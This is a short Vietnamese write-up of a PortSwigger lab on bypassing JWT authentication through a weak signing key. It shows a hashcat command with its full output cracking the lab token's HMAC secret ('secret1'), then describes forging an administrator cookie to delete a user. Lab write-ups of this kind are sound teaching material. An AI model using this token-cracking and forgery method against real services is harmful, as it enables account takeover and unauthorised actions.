# Lab: JWT authentication bypass via weak signing key

# 1. Vulnerable

1 đoạn mã `JWT` gồm 3 phần `header`, `payload`, `signature`

`Signature` được tạo ra từ `header + payload` và thuật toán hash với `secret key`

Nhiều dev sẽ sử dụng `sec_key` rất dễ đoán -> hacker sẽ brute force `secret key` để tạo ra `signature` tùy ý

# 2. Exploit

Đăng nhập vào tài khoản `wiener` đã được cho

![img0.png](images/img0.png)

Ta nhận được 1 `cookie` là mã `JWT`. Ta sẽ sử dụng hashcat để tìm ra `secret_key` nếu đó là 1 `secret_key` yếu

```bash
$ hashcat -a 0 -m 16500 eyJraWQiOiJhYzg4NTA3Yi1iMDRlLTQ3Y2YtYTdmYS04MzFjNDlmZDVjOGUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NjMwNjQ0N30.dBKLkQR0DPh6CJqvm_fyemXyDxoOTsx2Wfn-e4tM8BM /home/kali/Desktop/jwt.secrets.list 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-AMD Ryzen 5 5600H with Radeon Graphics, 1432/2929 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /home/kali/Desktop/jwt.secrets.list
* Passwords.: 103271
* Bytes.....: 1203512
* Keyspace..: 103261
* Runtime...: 0 secs

eyJraWQiOiJhYzg4NTA3Yi1iMDRlLTQ3Y2YtYTdmYS04MzFjNDlmZDVjOGUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NjMwNjQ0N30.dBKLkQR0DPh6CJqvm_fyemXyDxoOTsx2Wfn-e4tM8BM:secret1
```

Sau khi `hashcat` sử dụng `header`, `payload` và list `secret_key` để tạo ra mã JWT, nó sẽ so sánh với JWT đã được cung cấp, nếu giống nhau thì đó là `secret_key` cần tìm

Sử dụng `secret_key` để tạo ra 1 cookie của administrator và xóa `carlos`

![img1.png](images/img1.png)